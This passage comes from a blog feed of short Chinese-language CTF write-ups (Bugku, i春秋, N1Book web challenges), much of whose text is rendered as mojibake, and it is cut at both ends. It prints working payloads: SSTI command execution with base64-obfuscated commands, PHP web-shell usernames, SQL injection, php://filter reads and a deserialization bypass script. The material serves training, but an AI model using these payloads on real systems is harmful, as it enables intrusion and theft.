å¯†åŽ</p><p>cookies:</p><pre><code>session=.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.X7VhLg.TjoSPMRjbzbRBNeGnJ2EtXbpNCM</code></pre><p>flagï¼š</p><pre><code>n1book{afr_3_solved}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ã€Šä»Ž0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web-Flask_FileUpload</title>
      <link href="2021/05/13/bugku-web-flask-fileupload/"/>
      <url>2021/05/13/bugku-web-flask-fileupload/</url>
      
        <content type="html"><![CDATA[<p>F12çœ‹åˆ°å¯ä»¥ä¸Šä¼ pyè„šæœ¬ï¼Œ</p><p>ä¸Šä¼ jpgæ ¼å¼çš„</p><p>pyè„šæœ¬ï¼š</p><pre><code>import osos.system('cat /flag')</code></pre><p>åœ¨æºä»£ç ä¸­æŸ¥çœ‹flag</p><p><img src="/2021/05/13/bugku-web-flask-fileupload/c4db0ed7edb369e6c5c922264a3fea6.png" alt="c4db0ed7edb369e6c5c922264a3fea6"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šä»Ž0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹:Web-afr_1</title>
      <link href="2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/"/>
      <url>2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/b7901b4aa9628d957db9d6cafe1ed4a.png" alt="b7901b4aa9628d957db9d6cafe1ed4a"></p><p><img src="/2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/227ff2db7a1b0c6b3fd4f6d4bc2d656.png" alt="227ff2db7a1b0c6b3fd4f6d4bc2d656"></p><pre><code>?p=php://filter/read=convert.base64-encode/resource=flag</code></pre><p><img src="/2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/e4b4ff7ef7c1729762137bfe7e85344.png" alt="e4b4ff7ef7c1729762137bfe7e85344"></p><p><img src="/2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/cfb6513f5601da38e436d6ef44065bc.png" alt="cfb6513f5601da38e436d6ef44065bc"></p><pre><code>n1book{afr_1_solved}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ã€Šä»Ž0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web18-ç§‹åå±±å¸æœº</title>
      <link href="2021/05/12/bugku-web18-qiu-ming-shan-si-ji/"/>
      <url>2021/05/12/bugku-web18-qiu-ming-shan-si-ji/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/12/bugku-web18-qiu-ming-shan-si-ji/bdaaaa4f138f0bda35a9995faec2961.png" alt="bdaaaa4f138f0bda35a9995faec2961"></p><p><img src="/2021/05/12/bugku-web18-qiu-ming-shan-si-ji/5e0d83e24d8da06c267472732de8ed5.png" alt="5e0d83e24d8da06c267472732de8ed5"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web-Simple_SSTI_2</title>
      <link href="2021/05/11/bugku-web-simple-ssti-2/"/>
      <url>2021/05/11/bugku-web-simple-ssti-2/</url>
      
        <content type="html"><![CDATA[<pre><code>?flag={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20../%27).read()%20}}</code></pre><pre><code>?flag={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20../app/%27).read()%20}}</code></pre><pre><code>?flag={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20../app/flag%27).read()%20}}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web-game1</title>
      <link href="2021/05/10/bugku-web-game1/"/>
      <url>2021/05/10/bugku-web-game1/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/10/bugku-web-game1/ab49a807989a44b6ab79af366fd02be.png" alt="ab49a807989a44b6ab79af366fd02be"></p><p><img src="/2021/05/10/bugku-web-game1/34a8b6eac9f7577510e21cd7f49a906.png" alt="34a8b6eac9f7577510e21cd7f49a906"></p><p>æŠ“åŒ…å’ŒæŸ¥çœ‹ç½‘ç»œä¸­çš„signéƒ½å¯ä»¥æ‰¾åˆ°è¿™ä¸ªç‰›é©¬</p><p>å…¶ä¸­</p><pre><code>sign=zMMjU===</code></pre><p><img src="/2021/05/10/bugku-web-game1/3d130a54231bdb560c94b03704976ad.png" alt="3d130a54231bdb560c94b03704976ad"></p><p>MjU=ä¸º25çš„base64</p><p>æ‰€ä»¥æˆ‘ä»¬å§æˆç»©æ”¹ä¸º999999çš„base64ï¼šOTk5OTk5</p><pre><code>sign=zMOTk5OTk5==</code></pre><p><img src="/2021/05/10/bugku-web-game1/698ef3d8046503f3130672e7c6519e7.png" alt="698ef3d8046503f3130672e7c6519e7"></p><p>æ‹¿åˆ°flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-SomeWords</title>
      <link href="2021/05/09/i-chun-qiu-web-somewords/"/>
      <url>2021/05/09/i-chun-qiu-web-somewords/</url>
      
        <content type="html"><![CDATA[<pre><code>?id=updatexml(1,concat(0x7e,(select f14g from f14g),0x7e),1)</code></pre><p><img src="/2021/05/09/i-chun-qiu-web-somewords/963b46e85a453e6499edcb91657d809.png" alt="963b46e85a453e6499edcb91657d809"></p><pre><code>?id=updatexml(1,concat(reverse((select f14g from f14g))),1)</code></pre><p><img src="/2021/05/09/i-chun-qiu-web-somewords/b0bd2a2425baa0205d9c8c18c6aeee6.png" alt="b0bd2a2425baa0205d9c8c18c6aeee6"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-upload(svnæ³„éœ²)</title>
      <link href="2021/05/08/i-chun-qiu-web-upload-svn-xie-lu/"/>
      <url>2021/05/08/i-chun-qiu-web-upload-svn-xie-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="SVNæºç æ³„éœ²æ¼æ´ž"><a href="#SVNæºç æ³„éœ²æ¼æ´ž" class="headerlink" title="SVNæºç æ³„éœ²æ¼æ´ž"></a>SVNæºç æ³„éœ²æ¼æ´ž</h2><p><a href="https://blog.csdn.net/qq_36869808/article/details/88847364">https://blog.csdn.net/qq_36869808/article/details/88847364</a></p><p><strong>æ¦‚è¦</strong>ï¼šSVNæ˜¯æºä»£ç æœ¬æœ¬ç®¡ç†è½¯ä»¶ã€‚ä½¿ç”¨SVNç®¡ç†æœ¬åœ°ä»£ç è¿‡ç¨‹ä¸­ï¼Œä¼šç”Ÿæˆä¸€ä¸ªåä¸º.svnçš„éšè—æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­åŒ…å«é‡è¦çš„æºç ä¿¡æ¯ã€‚<br> <strong>å‡ºçŽ°åŽŸå› </strong>ï¼šç½‘ç«™ç®¡ç†å‘˜åœ¨å‘å¸ƒä»£ç æ—¶ï¼Œæ²¡æœ‰ä½¿ç”¨å¯¼å‡ºåŠŸèƒ½ï¼Œç›´æŽ¥è¿›è¡Œå¤åˆ¶ç²˜è´´ã€‚<br> <strong>æ¼æ´žä¾‹å­</strong>ï¼šxxxx/.svn/entries</p><p>å…³äºŽsvnçš„åŽŸç†ä¹‹å‰çœ‹è¿‡å¾ˆå¤šä¸ªï¼Œä½†æ˜¯å¤§å¤šå°±æ˜¯é€ æˆæ³„éœ²çš„åŽŸå› ï¼Œæ— éžå°±æ˜¯äººä¸ºç²—å¿ƒå¯¼è‡´çš„ã€‚</p><p>å…³äºŽsvnåˆ©ç”¨åˆ†ä¸¤ä¸ªç‰ˆæœ¬ä¸€ä¸ªç‰ˆæœ¬æ˜¯svn&gt;1.6ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯svn&lt;1.6</p><p>svn&gt;1.6,æ–‡ä»¶åä¼šè¢«hashï¼Œç„¶åŽå†æŒ‰ç…§æ–‡ä»¶åå¯¹åº”hashçš„æ–¹å¼å­˜åˆ°wc.dbä¸­,å°±æ˜¯ä¸ªsqliteæ•°æ®åº“ã€‚æœ€åŽæˆ‘ä»¬æŒ‰ç…§åç§°éåŽ†ä¸‹è½½å³å¯ã€‚</p><p>svn&lt;1.6,æ–‡ä»¶ä¼šå…ˆåŽ»è¯»å–entriesæ–‡ä»¶çš„ä¸­çš„ç›®å½•ç»“æž„,å› ä¸ºé»˜è®¤æ–‡ä»¶åéƒ½æ˜¯ç›´æŽ¥æ˜Žæ–‡å­˜çš„ã€‚</p><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><pre><code>import base64,requestsdef main():    a = requests.session()    b = a.get("http://549bc9defbb74fc5bf83a53d5f194bccf641983365c0447b.changame.ichunqiu.com/")    key1 = b.headers["flag"]    c = base64.b64decode(key1)    d = str(c).split(':')    key = base64.b64decode(d[1])    body = {"ichunqiu":key}    f = a.post("http://549bc9defbb74fc5bf83a53d5f194bccf641983365c0447b.changame.ichunqiu.com/",data=body)    print (f.text)if __name__ == '__main__':    main()</code></pre><p>å­—ç¬¦ä¸²çš„æ„æ€æ˜¯æç¤ºæˆ‘ä»¬ä¸€ä¸ªè·¯å¾„ï¼Œä¸ç®¡äº†ï¼Œè®¿é—®ä¹‹</p><p>Url/3712901a08bb58557943ca31f3487b7d</p><p>è¿›åŽ»æ˜¯ä¸€ä¸ªæ™®æ™®é€šé€šçš„è·³è½¬ç•Œé¢ï¼Œçœ‹æºç æ²¡ä»€ä¹ˆç‰¹åˆ«çš„</p><p>ç‚¹æŒ‰é’®è¿›å…¥ä¸‹ä¸€ç•Œé¢</p><p><img src="https://img2018.cnblogs.com/blog/1712230/201909/1712230-20190904230807381-697408493.png" alt="img"></p><p>å°±æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢äº†</p><p>svnæ³„éœ²</p><p>è®¿é—®</p><pre><code>/3712901a08bb58557943ca31f3487b7d/.svn/wc.db</code></pre><p>è§£å¼€usernameæ˜¯8638d5263ab0d3face193725c23ce095</p><p>3712901a08bb58557943ca31f3487b7d/7815696ecbf1c96e6894b779456d330e.php</p><p><img src="/2021/05/08/i-chun-qiu-web-upload-svn-xie-lu/5f82878beeb1d456ce6c635f6f709d2.png" alt="5f82878beeb1d456ce6c635f6f709d2"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-æ—¶é—´</title>
      <link href="2021/05/07/i-chun-qiu-web-shi-jian/"/>
      <url>2021/05/07/i-chun-qiu-web-shi-jian/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?php header("content-type:text/html;charset=utf-8");'å¤©ä¸‹æ­¦åŠŸå”¯å¿«ä¸ç ´';setcookie('token','hello');   show_source(__FILE__);if ($_COOKIE['token']=='hello'){        $txt = file_get_contents('flag.php');      $filename = 'u/'.md5(mt_rand(1,1000)).'.txt';   file_put_contents($filename,$txt);  sleep(10);  unlink($filename);}</code></pre><p>è®¿é—®ç½‘ç«™ï¼Œåœ¨10ç§’é‡Œä¼šç”Ÿæˆä¸€ä¸ªç›®å½•ï¼Œflagä¼šå†™åœ¨é‡Œé¢ã€‚ä½†æ˜¯10ç§’ä¹‹åŽè¿™ä¸ªç›®å½•ä¼šè¢«åˆ é™¤ã€‚é¦–å…ˆæˆ‘ä»¬è¦ç”Ÿæˆè¿™äº›äº›ç›®å½•ï¼Œç„¶åŽæ‹¿ç€è¿™äº›ç›®å½•å½“æˆå­—å…¸çˆ†ç ´</p><p>åç§’åŽç½‘é¡µå°±ä¼šå˜æˆè¿™æ ·ï¼š</p><p><img src="/2021/05/07/i-chun-qiu-web-shi-jian/7926171694d823f096c0abc383d4f10.png" alt="7926171694d823f096c0abc383d4f10"></p><pre><code>import hashlibimport requestsfile = open("data.txt",'w+')for i in range(1,1001):  m = hashlib.md5()  m.update(str(i).encode())  mid = m.hexdigest()  url = 'u/'+mid+'.txt'  file.write(url+'\n')file.close()</code></pre><p>ç”Ÿæˆçš„data.txtç²˜è´´åˆ°å¾¡å‰‘é…ç½®ç›®å½•ä¸­</p><p>åç§’å†…æ·»åŠ urlæ‰«æ</p><p><img src="/2021/05/07/i-chun-qiu-web-shi-jian/71af1f0c098871c29091abff8fc59ce-1620200164109.png" alt="71af1f0c098871c29091abff8fc59ce"></p><p><img src="/2021/05/07/i-chun-qiu-web-shi-jian/7258677249d5a299e5280c858e74163-1620200170576.png" alt="7258677249d5a299e5280c858e74163"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-OneThink</title>
      <link href="2021/05/06/i-chun-qiu-web-onethink/"/>
      <url>2021/05/06/i-chun-qiu-web-onethink/</url>
      
        <content type="html"><![CDATA[<h2 id="OneThink1-0æ–‡ä»¶ç¼“å­˜æ¼æ´žåˆ©ç”¨"><a href="#OneThink1-0æ–‡ä»¶ç¼“å­˜æ¼æ´žåˆ©ç”¨" class="headerlink" title="OneThink1.0æ–‡ä»¶ç¼“å­˜æ¼æ´žåˆ©ç”¨"></a>OneThink1.0æ–‡ä»¶ç¼“å­˜æ¼æ´žåˆ©ç”¨</h2><p>é¦–å…ˆåˆ©ç”¨è¯¥æ¼æ´žå°è¯•æ‰§è¡Œphpinfoã€‚<br> æ³¨å†Œç”¨æˆ·<code>%0aphpinfo();#</code><br> å…¶ä¸­<code>%0a</code>æ˜¯è®©ç”¨æˆ·ååœ¨ç¼“å­˜æ–‡ä»¶ä¸­ä»¥æ–°çš„ä¸€è¡Œå¼€å§‹ï¼ˆå‰é¢åˆ†æžä»£ç æ—¶æåˆ°<code>$data</code>ä¼šå’Œå‰é¢çš„<code>&lt;?phpn//</code>æ‹¼æŽ¥ï¼Œè¿™é‡Œæ˜¯é˜²æ­¢è¢«<code>//</code>æ³¨é‡Šï¼‰ï¼Œè€Œ#æ³¨é‡Šç¬¦åˆ™è®©ä¹‹åŽåºåˆ—åŒ–äº§ç”Ÿçš„å­—ç¬¦å¤±æ•ˆï¼Œé˜²æ­¢å½±å“å‡½æ•°æ‰§è¡Œã€‚</p><p>æäº¤æ³¨å†Œï¼Œé€šè¿‡Burpsuitè¿›è¡Œæ‹¦æˆªï¼Œè¿™é‡Œå°†<code>%0a</code>è¿›è¡Œurlç¼–ç è§£ç ï¼Œæˆä¸ºæ¢è¡Œç¬¦</p><p>å°†æ•°æ®åŒ…æ”¾è¡ŒåŽï¼Œç”¨æˆ·æ³¨å†ŒæˆåŠŸï¼Œè¿›å…¥ç™»å½•ç•Œé¢è¿›è¡Œç™»å½•ï¼š</p><p>åŒæ ·è¿›è¡ŒæŠ“åŒ…æ‹¦æˆªï¼Œä¿®æ”¹%0aåŽæ”¾è¡Œï¼š</p><p>payloadç”¨æˆ·ç™»å½•æˆåŠŸï¼ŒæŽ¥ä¸‹æ¥è®¿é—®ç¼“å­˜é¡µé¢<br> å‘çŽ°æˆåŠŸæ‰§è¡Œphpinfo()ï¼</p><p>åœ¨æœ¬åœ°æ­å»ºåŒæ ·çŽ¯å¢ƒåŽæµ‹è¯•ï¼Œå‘çŽ°ç¼“å­˜æ–‡ä»¶ä¸­å†…å®¹å¦‚ä¸‹ï¼š</p><p>åŒæ ·çš„æ–¹æ³•å‘ç¼“å­˜æ–‡ä»¶ä¸­å†™å…¥ä»£ç æ‰§è¡Œï¼š</p><pre class=" language-v"><code class="language-v">%0a$a=$_GET[a];#%0asystem($a);#</code></pre><p>å‚è€ƒ:<a href="https://www.anquanke.com/post/id/152584">https://www.anquanke.com/post/id/152584</a></p><h2 id="å®žä¾‹-iæ˜¥ç§‹-Web-OneThink"><a href="#å®žä¾‹-iæ˜¥ç§‹-Web-OneThink" class="headerlink" title="å®žä¾‹:iæ˜¥ç§‹:Web-OneThink"></a>å®žä¾‹:iæ˜¥ç§‹:Web-OneThink</h2><ol><li>æ¢è¡Œç¬¦çš„urlç¼–ç æ˜¯%0Aï¼›</li><li>onethinkæ˜¯ä¸€ä¸ªCMSå¹³å°ï¼›</li><li>oneThink1.0å­˜åœ¨ä¸€ä¸ªæŠŠç”¨æˆ·åç¼“å­˜ä¸‹æ¥çš„æ¼æ´žï¼Œå¯ä»¥ä¿®æ”¹ç”¨æˆ·åä¸ºphpä»£ç è¿›è¡Œæ‰§è¡Œï¼›</li><li>phpinfo(); è¾“å‡ºphpä¿¡æ¯</li><li><code>system($_GET[cmd]);</code>ï¼Œèƒ½æ‰§è¡Œä¼ å…¥çš„cmdå‘½ä»¤ï¼Œå¹¶ä¸”å›žæ˜¾åœ¨å“åº”ä¸­ï¼›</li></ol><p>æ³¨å†Œç”¨æˆ·åä¼šè¢«ç¼“å­˜è¿›ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åŽæ³¨å†Œä¸€ä¸ªä¸€å¥è¯æœ¨é©¬åšç”¨æˆ·åï¼Œè®¿é—®ç¼“å­˜æ–‡ä»¶ï¼Œå°±èƒ½æˆã€‚</p><p>ä¸¤ä¸ªè´¦å·ï¼š</p><pre><code>%0a$a=$_GET[a];//  %0aecho  `$a`;//     #(%0aæ˜¯æ¢è¡Œç¬¦çš„urlencode)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-zone</title>
      <link href="2021/05/05/i-chun-qiu-web-zone/"/>
      <url>2021/05/05/i-chun-qiu-web-zone/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/05/i-chun-qiu-web-zone/5bd4424eb057a35becb1bcdefa1e513.png" alt="5bd4424eb057a35becb1bcdefa1e513"></p><p><img src="/2021/05/05/i-chun-qiu-web-zone/dcde2241e79e9c544a3e51ff695a434.png" alt="dcde2241e79e9c544a3e51ff695a434"></p><p><img src="/2021/05/05/i-chun-qiu-web-zone/b1073fb6497f5a8f291a4d17922bf1c-1620205443760.png" alt="b1073fb6497f5a8f291a4d17922bf1c"></p><p><img src="/2021/05/05/i-chun-qiu-web-zone/0217231cc6d139dbfe81f2dbf3ccd6a-1620205448474.png" alt="0217231cc6d139dbfe81f2dbf3ccd6a"></p><p><img src="/2021/05/05/i-chun-qiu-web-zone/cadc5122fde6dc14284d9fd8d9b9f1b.png" alt="cadc5122fde6dc14284d9fd8d9b9f1b"></p><p><img src="/2021/05/05/i-chun-qiu-web-zone/5835aab478bd7dbd5efcc8089dbada1.png" alt="5835aab478bd7dbd5efcc8089dbada1"></p><p>ç›´æŽ¥è®¿é—®ä¸‹è½½ä¹Ÿæ˜¯å¯ä»¥çš„</p><p><img src="/2021/05/05/i-chun-qiu-web-zone/032dcbdbcf4d05dbf4bdffc7735673b.png" alt="032dcbdbcf4d05dbf4bdffc7735673b"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-fuzz</title>
      <link href="2021/05/04/i-chun-qiu-web-fuzz/"/>
      <url>2021/05/04/i-chun-qiu-web-fuzz/</url>
      
        <content type="html"><![CDATA[<p>å°è¯•åˆ°?name=123æœ‰å“åº”</p><p><img src="/2021/05/04/i-chun-qiu-web-fuzz/54ac388556a196af663d2ff92856dbf.png" alt="54ac388556a196af663d2ff92856dbf"></p><p>å°è¯•åŽå‘çŽ°é‚£æ˜¯pythonæ¨¡æ¿æ³¨å…¥</p><p><img src="/2021/05/04/i-chun-qiu-web-fuzz/17e4537ea72479036d8f76a83cb2204.png" alt="17e4537ea72479036d8f76a83cb2204"></p><p>è¯»ç‰ˆæœ¬æ–‡ä»¶ï¼š</p><pre><code>?name={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/issue').read() }}</code></pre><p>å‘SSTIæ¼æ´žæ³¨å…¥ï¼š</p><pre><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg',  'w').write('from subprocess import check_output\n\nRUNCMD =  check_output\n') }}  </code></pre><p>ï¼ˆè¿™å°†å‘è¿œç¨‹æœåŠ¡å™¨å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œå½“ç¼–è¯‘å®Œæˆä¸ºsubprocessæ¨¡å—å¼•å…¥check_outputæ–¹æ³•ï¼Œå¹¶å°†å…¶è®¾ç½®æŒ‡å‘å˜é‡RUNCMDã€‚ï¼‰</p><p>å‘configå¯¹è±¡æ·»åŠ ä¸€ä¸ªæ–°é¡¹ï¼š</p><pre><code>?name={{ config.from_pyfile('/tmp/owned.cfg') }}</code></pre><p>é€šè¿‡å‘SSTIæ¼æ´žæ³¨å…¥æ¥æ£€æµ‹æ˜¯å¦æˆåŠŸï¼š</p><pre><code>?name={{ config['RUNCMD']('/usr/bin/id',shell=True) }}</code></pre><p>æˆåŠŸè¿”å›ž</p><p><img src="/2021/05/04/i-chun-qiu-web-fuzz/b9e8213208fff1dfcab326bceae2417-1620188922808.png" alt="b9e8213208fff1dfcab326bceae2417"></p><p>ä¿®æ”¹å¼•å·å†…å®¹ä¸ºls</p><p><img src="/2021/05/04/i-chun-qiu-web-fuzz/87595f52406ee2000d003adb6c40911.png" alt="87595f52406ee2000d003adb6c40911"></p><p>æ²¡æœ‰è¿”å›žï¼Œå°è¯•ls -al</p><pre><code>?name={{ config['RUNCMD']('`echo bHMgLWFsCg== | base64 -d`',shell=True) }}</code></pre><p><img src="/2021/05/04/i-chun-qiu-web-fuzz/ebee99c8cdefcfac602bcecda6108ad.png" alt="ebee99c8cdefcfac602bcecda6108ad"></p><ul><li>Hello total 24</li><li>drwxâ€”â€”.  2 root root 4096 May  5 03:47 .</li><li>drwxr-xr-x. 21 root root 4096 May  5 03:47 ..</li><li>-rwâ€”â€”-.  1 root root  165 Nov  9  2016 .bash_history</li><li>-rw-râ€“râ€“.  1 root root 3106 Feb 20  2014 .bashrc</li><li>-rw-râ€“râ€“.  1 root root   18 Nov  8  2016 .config</li><li>-rw-râ€“râ€“.  1 root root  140 Feb 20  2014 .profile</li></ul><p>æŸ¥çœ‹var/www/htmlä¸‹çš„æ–‡ä»¶å</p><pre><code>?name={{ config['RUNCMD']('`echo bHMgLWFsIC92YXIvd3d3L2h0bWwK | base64 -d`',shell=True) }}</code></pre><p><img src="/2021/05/04/i-chun-qiu-web-fuzz/2b80f651f715ca9f6e12ef75c4ef515.png" alt="2b80f651f715ca9f6e12ef75c4ef515"></p><ul><li>Hello total 48</li><li>drwxr-xr-x. 2 root root  4096 May  5 03:47 .</li><li>drwxr-xr-x. 3 root root  4096 Nov  9  2016 ..</li><li>-rw-râ€“râ€“  1 root root    43 May  5 03:47 fl4g</li><li>-rw-râ€“râ€“. 1 root root 34913 Nov  9  2016 x.py</li></ul><p>æŸ¥çœ‹fl4gæ–‡ä»¶ï¼ˆcat var/www/html/fl4gï¼‰</p><pre><code>?name={{ config['RUNCMD']('`echo Y2F0IC92YXIvd3d3L2h0bWwvZmw0Zwo= | base64 -d`',shell=True) }}</code></pre><p><img src="/2021/05/04/i-chun-qiu-web-fuzz/150037e3effd632359f01b4c3663d15.png" alt="150037e3effd632359f01b4c3663d15"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-Hash</title>
      <link href="2021/05/03/i-chun-qiu-web-hash/"/>
      <url>2021/05/03/i-chun-qiu-web-hash/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/03/i-chun-qiu-web-hash/db497ae3ef59f08ca53247fcccdaf07.png" alt="db497ae3ef59f08ca53247fcccdaf07"></p><p>æºä»£ç ä¸­ï¼š$hash=md5($sign.$key);the length of $sign is 8</p><p>index.php?key=111&amp;hash=adaa10eef3a02754da03b5a3a6f40ae6</p><p><img src="/2021/05/03/i-chun-qiu-web-hash/ad1712cf058b244469e8072040a775e.png" alt="ad1712cf058b244469e8072040a775e"></p><pre><code>&lt;?php class&nbsp;Demo&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$file&nbsp;=&nbsp;'Gu3ss_m3_h2h2.php'; &nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct($file)&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;file&nbsp;=&nbsp;$file; &nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;__destruct()&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;@highlight_file($this-&gt;file,&nbsp;true); &nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;__wakeup()&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($this-&gt;file&nbsp;!=&nbsp;'Gu3ss_m3_h2h2.php')&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//the&nbsp;secret&nbsp;is&nbsp;in&nbsp;the&nbsp;f15g_1s_here.php &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;file&nbsp;=&nbsp;'Gu3ss_m3_h2h2.php'; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;} } if&nbsp;(isset($_GET['var']))&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;$var&nbsp;=&nbsp;base64_decode($_GET['var']); &nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(preg_match('/[oc]:\d+:/i',&nbsp;$var))&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;die('stop&nbsp;hacking!'); &nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@unserialize($var); &nbsp;&nbsp;&nbsp;&nbsp;} }&nbsp;else&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;highlight_file("Gu3ss_m3_h2h2.php"); } ?&gt; </code></pre><p>ä¸Šè„šæœ¬</p><pre><code>&lt;?phpclass Demo {    private $file = 'Gu3ss_m3_h2h2.php';    public function __construct($file) {        $this-&gt;file = $file;    }    function __destruct() {        echo @highlight_file($this-&gt;file, true);    }    function __wakeup() {        if ($this-&gt;file != 'Gu3ss_m3_h2h2.php') {            //the secret is in the f15g_1s_here.php            $this-&gt;file = 'Gu3ss_m3_h2h2.php';        }    }}$a = new Demo('f15g_1s_here.php');$s = serialize($a);echo $s;echo '&lt;br&gt;';$s = str_replace('O:4', 'O:+4',$s);//ç»•è¿‡æ­£åˆ™$s = str_replace(':1:', ':2:' ,$s);//ç»•è¿‡wakeupå‡½æ•°echo base64_encode($s);//æœ€åŽbase64ç¼–ç ?&gt;</code></pre><pre><code>Gu3ss_m3_h2h2.php?var=TzorNDoiRGVtbyI6ODp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==</code></pre><p>ä¸‹ä¸ªç•Œé¢ï¼š</p><pre><code>&lt;?php if&nbsp;(isset($_GET['val']))&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;$val&nbsp;=&nbsp;$_GET['val']; &nbsp;&nbsp;&nbsp;&nbsp;eval('$value="'&nbsp;.&nbsp;addslashes($val)&nbsp;.&nbsp;'";'); }&nbsp;else&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;die('hahaha!'); } ?&gt; </code></pre><p>å†å®¡è®¡ï¼Œå¦‚æžœå­˜åœ¨GETä¼ å…¥çš„valå°±ä»¤å˜é‡valç­‰äºŽå…¶ï¼Œç„¶åŽevalä¸€æ®µå†…å®¹ï¼Œå†…å®¹å…·ä½“ç»„æˆæ˜¯valueçš„å€¼è¿žä¸Švalçš„addslashesè½¬ä¹‰å­—ç¬¦ä¸²å†è¿žä¸Š;ç»„æˆ<br>å¾ˆæ˜Žæ˜¾äº†ï¼Œè¿™é‡Œå°±è¦æˆ‘ä»¬åˆ©ç”¨eval()æ¥èŽ·å–åˆ°flag<br>å…ˆè¯•è¯•f15g_1s_here.php?val=${eval(â€œecho â€˜lsâ€™ 